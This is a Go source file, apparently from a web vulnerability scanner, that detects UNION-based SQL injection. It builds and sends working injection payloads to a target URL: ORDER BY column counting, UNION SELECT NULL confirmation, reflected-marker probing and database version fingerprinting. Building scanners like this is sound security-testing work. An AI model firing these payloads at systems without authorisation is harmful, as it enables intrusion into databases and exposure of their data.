package injection

import (
	"context"
	"fmt"
	"strings"

	"github.com/TyrusRC/assay/internal/detection/analysis"
	assayhttp "github.com/TyrusRC/assay/internal/http"
)

const (
	unionMaxColumns    = 30
	unionMarker        = "assay_union_7x3m"
	unionSimilarityThr = 0.9
)

// UnionResult contains the result of UNION-based SQLi detection.
type UnionResult struct {
	IsVulnerable    bool
	ColumnCount     int
	ReflectedColumn int
	DatabaseType    DatabaseType
	Evidence        string
	Payload         string
}

// dbSuffix returns the FROM-clause suffix needed by the database for a
// bare SELECT. Oracle requires FROM dual; the rest don't.
type dbVariant struct {
	name       string
	suffix     string // appended after the SELECT columns
	commentEnd string // terminates the injected statement
}

var dbVariants = []dbVariant{
	{"generic", "", "--"},
	{"generic-hash", "", "#"},
	{"oracle", " FROM dual", "--"},
}

// DetectUnion probes a parameter for UNION-based SQL injection. It uses
// binary search on ORDER BY to find the column count, then a NULL-based
// UNION SELECT to confirm, and finally a marker string to identify a
// reflected column.
func (d *SQLiDetector) DetectUnion(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL, param, method string,
) (*UnionResult, error) {
	res := &UnionResult{}
	if client == nil {
		return res, nil
	}

	originalValue := extractParamValue(targetURL, param)

	baselineResp, err := client.Get(ctx, targetURL)
	if err != nil || baselineResp == nil {
		return res, err
	}
	baselineBody := analysis.StripDynamicContent(baselineResp.Body)

	for _, variant := range dbVariants {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}

		colCount := d.findColumnCount(ctx, client, targetURL, param, method, originalValue, baselineBody, variant)
		if colCount <= 0 {
			continue
		}

		if confirmed := d.confirmUnion(ctx, client, targetURL, param, method, originalValue, baselineBody, colCount, variant); !confirmed {
			continue
		}

		reflectedCol, marker := d.findReflectedColumn(ctx, client, targetURL, param, method, originalValue, colCount, variant)

		res.IsVulnerable = true
		res.ColumnCount = colCount
		res.ReflectedColumn = reflectedCol
		res.Payload = d.buildUnionPayload(originalValue, colCount, -1, variant)
		if reflectedCol >= 0 {
			res.Evidence = fmt.Sprintf("UNION SELECT with %d columns; marker '%s' reflected in column %d", colCount, marker, reflectedCol+1)
		} else {
			res.Evidence = fmt.Sprintf("UNION SELECT with %d columns confirmed (no reflected column found)", colCount)
		}

		dbType := d.detectDBFromUnion(ctx, client, targetURL, param, method, originalValue, colCount, reflectedCol, variant)
		res.DatabaseType = dbType
		return res, nil
	}

	return res, nil
}

// findColumnCount uses binary search on ORDER BY N to determine the
// number of columns in the query.
func (d *SQLiDetector) findColumnCount(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL, param, method, originalValue, baselineBody string,
	v dbVariant,
) int {
	// First confirm ORDER BY 1 works (same as baseline).
	resp1, err := d.sendOrderBy(ctx, client, targetURL, param, method, originalValue, 1, v)
	if err != nil || resp1 == nil {
		return -1
	}
	body1 := analysis.StripDynamicContent(resp1.Body)
	if analysis.ResponseSimilarity(baselineBody, body1) < unionSimilarityThr {
		return -1
	}

	// Find the upper bound where ORDER BY N fails.
	hi := 1
	for hi <= unionMaxColumns {
		select {
		case <-ctx.Done():
			return -1
		default:
		}
		hi *= 2
		if hi > unionMaxColumns {
			hi = unionMaxColumns + 1
		}
		resp, err := d.sendOrderBy(ctx, client, targetURL, param, method, originalValue, hi, v)
		if err != nil || resp == nil {
			return -1
		}
		bodyN := analysis.StripDynamicContent(resp.Body)
		if analysis.ResponseSimilarity(baselineBody, bodyN) < unionSimilarityThr {
			break
		}
		if hi > unionMaxColumns {
			return -1
		}
	}

	// Binary search between lo (works) and hi (fails).
	lo := hi / 2
	if lo < 1 {
		lo = 1
	}
	for lo < hi-1 {
		select {
		case <-ctx.Done():
			return -1
		default:
		}
		mid := (lo + hi) / 2
		resp, err := d.sendOrderBy(ctx, client, targetURL, param, method, originalValue, mid, v)
		if err != nil || resp == nil {
			return -1
		}
		bodyMid := analysis.StripDynamicContent(resp.Body)
		if analysis.ResponseSimilarity(baselineBody, bodyMid) >= unionSimilarityThr {
			lo = mid
		} else {
			hi = mid
		}
	}
	return lo
}

func (d *SQLiDetector) sendOrderBy(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL, param, method, originalValue string,
	n int,
	v dbVariant,
) (*assayhttp.Response, error) {
	payload := fmt.Sprintf("%s' ORDER BY %d%s", originalValue, n, v.commentEnd)
	return client.SendPayload(ctx, targetURL, param, payload, method)
}

// confirmUnion sends a UNION SELECT NULL,...,NULL and checks the response
// is different from a syntax error but not an error page.
func (d *SQLiDetector) confirmUnion(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL, param, method, originalValue, baselineBody string,
	colCount int,
	v dbVariant,
) bool {
	payload := d.buildUnionPayload(originalValue, colCount, -1, v)
	resp, err := client.SendPayload(ctx, targetURL, param, payload, method)
	if err != nil || resp == nil {
		return false
	}
	body := analysis.StripDynamicContent(resp.Body)

	// A successful UNION should produce a response similar to baseline
	// (the NULL row adds content but doesn't break the page) OR a clearly
	// different page (extra row injected). Either way, it should NOT look
	// like an error — check that it doesn't match SQL error patterns.
	errorAnalysis := d.AnalyzeResponse(resp.Body)
	if errorAnalysis.IsVulnerable {
		return false
	}

	// The UNION response should differ from an invalid column count
	// response (which is an error page).
	badPayload := d.buildUnionPayload(originalValue, colCount+1, -1, v)
	badResp, err := client.SendPayload(ctx, targetURL, param, badPayload, method)
	if err != nil || badResp == nil {
		// Can't verify the differential — accept if body is similar to baseline.
		return analysis.ResponseSimilarity(baselineBody, body) >= 0.5
	}
	badBody := analysis.StripDynamicContent(badResp.Body)
	return analysis.ResponseSimilarity(body, badBody) < unionSimilarityThr
}

// buildUnionPayload constructs the UNION SELECT payload. markerCol >= 0
// places the marker string in that column position; -1 uses all NULLs.
func (d *SQLiDetector) buildUnionPayload(originalValue string, colCount, markerCol int, v dbVariant) string {
	cols := make([]string, colCount)
	for i := range cols {
		if i == markerCol {
			cols[i] = fmt.Sprintf("'%s'", unionMarker)
		} else {
			cols[i] = "NULL"
		}
	}
	return fmt.Sprintf("%s' UNION SELECT %s%s%s", originalValue, strings.Join(cols, ","), v.suffix, v.commentEnd)
}

// findReflectedColumn replaces each NULL with a marker string to find
// which column is reflected in the response body.
func (d *SQLiDetector) findReflectedColumn(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL, param, method, originalValue string,
	colCount int,
	v dbVariant,
) (int, string) {
	for i := 0; i < colCount; i++ {
		select {
		case <-ctx.Done():
			return -1, ""
		default:
		}
		marker := fmt.Sprintf("%s_%d", unionMarker, i)
		cols := make([]string, colCount)
		for j := range cols {
			if j == i {
				cols[j] = fmt.Sprintf("'%s'", marker)
			} else {
				cols[j] = "NULL"
			}
		}
		payload := fmt.Sprintf("%s' UNION SELECT %s%s%s", originalValue, strings.Join(cols, ","), v.suffix, v.commentEnd)
		resp, err := client.SendPayload(ctx, targetURL, param, payload, method)
		if err != nil || resp == nil {
			continue
		}
		if strings.Contains(resp.Body, marker) {
			return i, marker
		}
	}
	return -1, ""
}

// detectDBFromUnion tries to identify the database by placing
// version-detection functions in the reflected column.
func (d *SQLiDetector) detectDBFromUnion(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL, param, method, originalValue string,
	colCount, reflectedCol int,
	v dbVariant,
) DatabaseType {
	if reflectedCol < 0 {
		return DBUnknown
	}

	versionProbes := []struct {
		expr string
		db   DatabaseType
	}{
		{"@@version", DBMySQL},
		{"version()", DBPostgreSQL},
		{"@@version", DBMSSQL},
		{"sqlite_version()", DBSQLite},
	}

	for _, probe := range versionProbes {
		select {
		case <-ctx.Done():
			return DBUnknown
		default:
		}
		cols := make([]string, colCount)
		for i := range cols {
			if i == reflectedCol {
				cols[i] = probe.expr
			} else {
				cols[i] = "NULL"
			}
		}
		payload := fmt.Sprintf("%s' UNION SELECT %s%s%s", originalValue, strings.Join(cols, ","), v.suffix, v.commentEnd)
		resp, err := client.SendPayload(ctx, targetURL, param, payload, method)
		if err != nil || resp == nil {
			continue
		}
		detected := d.DetectDBType(resp.Body)
		if detected != DBUnknown {
			return detected
		}
	}
	return DBUnknown
}
